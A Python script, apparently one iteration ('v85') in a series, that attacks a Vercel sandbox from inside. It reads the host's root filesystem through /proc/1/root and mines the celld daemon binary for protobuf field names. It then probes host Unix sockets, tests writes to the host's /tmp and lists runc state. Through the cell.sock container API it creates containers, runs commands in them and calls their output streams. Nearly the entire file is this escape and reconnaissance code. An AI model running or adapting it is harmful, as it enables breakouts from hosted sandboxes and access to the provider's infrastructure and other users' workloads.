# -*- coding: utf-8 -*-
"""v85 payload: StreamOutputRequest 完整字段定义 + OutputStream 枚举值 map + 重跑 D-G
v84 确认: OUTPUT_STREAM_STDOUT/STDERR/UNSPECIFIED 枚举存在, OutputStream_name/_value map 存在
方法: protobuf tag 字符串 (name=xxx) + OutputStream_name map 内容"""
import socket, time, os, json, re

OUT = '/vercel/sandbox/v85c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v85c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:100], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def main():
    log('V85 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    R = '/proc/1/root'

    data = open(R + '/opt/vercel/celld', 'rb').read()
    log('celld size=%d' % len(data))

    # A. StreamOutputRequest/Response/ExecRequest Getter (确保拿到)
    for msg in ('StreamOutputRequest', 'StreamOutputResponse', 'ExecRequest', 'ExecResponse'):
        pat = re.compile(re.escape(msg.encode()) + rb'\)\.Get([A-Za-z0-9_]+)')
        got = sorted(set(m.group(1).decode() for m in pat.finditer(data)))
        log('GET %s -> %s' % (msg, got))

    # B. protobuf tag 字段号 (关键字段名)
    for fn in ('container_id', 'process_id', 'stream', 'data', 'output_stream',
               'stdout', 'stderr', 'attach_stdin', 'sandbox_id'):
        pat = re.compile(rb'protobuf:"[^"]*name=' + re.escape(fn.encode()) + rb'[^"]*"')
        ms = pat.findall(data)
        log('TAG %-16s x%d -> %s' % (fn, len(ms), [m[:150] for m in ms[:8]]))

    # C. StreamOutputRequest 附近 30KB 所有 tag
    for anchor in ('StreamOutputRequest', 'StreamOutputResponse'):
        idx = data.find(anchor.encode())
        if idx < 0:
            log('ANCHOR %s NOT FOUND' % anchor)
            continue
        seg = data[max(0, idx - 5000):idx + 30000]
        tags = re.findall(rb'protobuf:"[^"]+",opt,name=([a-z_0-9]+)', seg)
        log('NEAR %s -> %s' % (anchor, sorted(set(t.decode() for t in tags))))

    # D. OutputStream 枚举 map 内容
    for sym in ('OutputStream_name', 'OutputStream_value'):
        for m in re.finditer(re.escape(sym.encode()), data):
            i = m.start()
            seg = data[i:i + 900]
            strs = re.findall(rb'[\x20-\x7e]{4,}', seg)
            uniq = []
            seen = set()
            for s in strs:
                k = s[:40]
                if k in seen:
                    continue
                seen.add(k)
                uniq.append(s)
            log('MAP %s -> %s' % (sym, ' | '.join(x.decode(errors='replace')[:60] for x in uniq[:15])))
            break

    # E. host socket / 写 / runc dir / unix 回连 (一行式精简)
    for sp in ('/run/cell/host.sock', '/run/cell/agent.sock', '/run/metrics/metrics.sock',
               '/run/apm/apm.sock'):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(R + sp)
            log('SOCK %s OK' % sp)
            s.close()
        except Exception as e:
            log('SOCK %s %s' % (sp, type(e).__name__))
    try:
        open(R + '/tmp/v85_write_test.txt', 'w').write('v85 write test\n')
        log('WRITE-OK')
    except Exception as e:
        log('WRITE-ERR %s' % e)
    try:
        base = R + '/run/cell/runc'
        for d in sorted(os.listdir(base)):
            log('RUNC %s -> %s' % (d, ';'.join(sorted(os.listdir(base + '/' + d))[:15])))
    except Exception as e:
        log('RUNC-ERR %s' % e)

    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if cid:
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        time.sleep(1)
        argv = ['/bin/sh', '-c',
                'rm -f /run/v85x.sock; python3 -c "import socket,os;'
                's=socket.socket(socket.AF_UNIX);s.bind(\'/run/v85x.sock\');s.listen(1);'
                'c,a=s.accept();c.send(b\'V85_UNIX_OK\');c.close();s.close();os.unlink(\'/run/v85x.sock\')" & '
                'sleep 20']
        st, bd = exec_cmd(CTR, cid, argv, t=6)
        PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
        log('execA PA=%s' % (PA or bd[:100]))
        time.sleep(2)
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect('/run/v85x.sock')
            log('UNIX-OK got=%r' % s.recv(100))
            s.close()
        except Exception as e:
            log('UNIX-ERR %s' % type(e).__name__)
        log('host-sock-exists=%s' % os.path.exists('/run/v85x.sock'))
        # StreamOutput 用新字段名组合试试: container_id + stream enum
        for stream_val, label in ((1, 'STDOUT'), (2, 'STDERR')):
            pl = pstr(1, cid) + pstr(2, PA) + pvarint((3 << 3) | 0) + pvarint(stream_val)
            st, hd, bd = rpc_raw(CTR + '/StreamOutput', b'\x00' + struct.pack('>I', len(pl)) + pl,
                                 'application/grpc', t=5)
            log('STREAM %s -> %s %r' % (label, st, bd[:120]))
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('killed')

    log('V85C_DONE')


import struct
main()
